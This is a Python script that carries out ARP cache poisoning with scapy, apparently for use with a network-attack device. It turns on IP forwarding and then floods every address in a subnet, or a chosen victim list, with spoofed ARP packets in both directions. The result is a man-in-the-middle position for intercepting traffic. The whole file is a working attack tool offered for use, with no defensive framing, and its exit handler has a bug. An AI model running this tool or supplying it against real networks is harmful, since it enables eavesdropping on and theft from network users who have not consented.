#!/usr/bin/env python3
'''
Basic arp cache poisoner using scapy
Intended to be used with Portia Pineapple
'''

def poison(
        victim_list, spoofed_ip, interface,
        full_duplex=True, sleep_time=3, verbose_level=0):
    """
    Used to arp poison the local subnet
    Takes three required arguments and three optional arguments
    victim_list must be a valid list(str(ipv4)) addresses
        list of hosts to poison stating we are the spoofed ip address
    spoofed_ip must be a valid str(ipv4) address
        the ip address that will be spoofing to all the victims
    interface must be a valid str(interface) present on the system
        the interface on tha machine to execute the attack on
    full_duplex must be a bool()
        specify if to poison both ways or one way
    sleep_time must be a valid float(seconds)
        amount of time (in seconds) to wait before sending arp packets to all victims
    verbose_level must be a valid int()
        used to dictate messages to the console about status of packets being sent
    Does not return a value, runs an infinite loop
    """

    from time import sleep
    from scapy.all import sendp, Ether, ARP

    victim_list = [str(_) for _ in victim_list if _ != spoofed_ip]

    with open("/sys/class/net/{iface:}/address".format(iface=interface)) as fin:
        iface_mac = fin.read(17)

    pkt_to_clients = Ether(src=iface_mac, dst="ff:ff:ff:ff:ff:ff")/ARP(
        op=1, hwsrc=iface_mac, psrc=spoofed_ip, hwdst="00:00:00:00:00:00", pdst=victim_list)

    pkt_to_gateway = Ether(src=iface_mac, dst="ff:ff:ff:ff:ff:ff")/ ARP(
        op=1, hwsrc=iface_mac, psrc=victim_list, hwdst="00:00:00:00:00:00", pdst=spoofed_ip)

    while True:
        sendp(pkt_to_clients, verbose=verbose_level, iface=interface)
        if full_duplex:
            sendp(pkt_to_gateway, verbose=verbose_level, iface=interface)
        sleep(sleep_time)

def set_ip_forward(enable):
    """
    Used to set the system to enable/disable forwarding ipv4 packets
    Requires a valid bool()
    True will set the system to forward ipv4 packets, False will disable this
    returns result of file.write

    Requires permission to write to /proc/sys/net/ipv4/ip_forward
    """

    if not isinstance(enable, bool):
        raise TypeError("'enable' must be of type 'bool'")

    with open("/proc/sys/net/ipv4/ip_forward", "w") as fout:
        return fout.write(str(int(enable)))

def is_ip_forwarding():
    """
    Used to check if system is allowing the forwarding of ipv4 packets
    returns True if so, else returns False
    """

    with open("/proc/sys/net/ipv4/ip_forward") as fin:
        return bool(int(fin.read()))

def main():
    """
    Default functionality of script
    """

    import atexit
    from sys import argv
    from legs import config

    options = config.arg_config(argv)

    if not is_ip_forwarding():
        print("Enabling IPv4 forwarding")
        set_ip_forward(True)
        atexit.register(set_ip_forward(False))
        atexit.register(print, "Restoring ip forwarding")

    print("IPv4 forwarding enabled")

    #Generate list of hosts to poison
    if options.get("Extra", "iplist", fallback=False):
        print("Using provided list of ip addresses")
        print("[WARNING] this does nothing right now, sorry")
        exit(0)
        #TODO: this
    else:
        import ipaddress
        victims = [str(_) for _ in
                   ipaddress.ip_network("{}/{}".format(
                       options.get("Target", "ip4"),
                       options.get("Misc", "network_cider")), strict=False)
                   if _ != options.get("Target", "ip4")
                   and _ not in options.get("Misc", "ip4_exclude").split(",")][1:-1]

    print("{} ip's added to target list".format(len(victims)))

    #poison till killed
    print("Poisoning network")
    try:
        poison(
            interface=options.get("Misc", "iface"),
            spoofed_ip=options.get("Target", "ip4"),
            victim_list=victims, verbose_level=1)
    except KeyboardInterrupt:
        print("\nStopping arp poison")

if __name__ == "__main__":
    from os import getuid
    if getuid():
        print("Need to run as root")
        exit(-1)
    main()
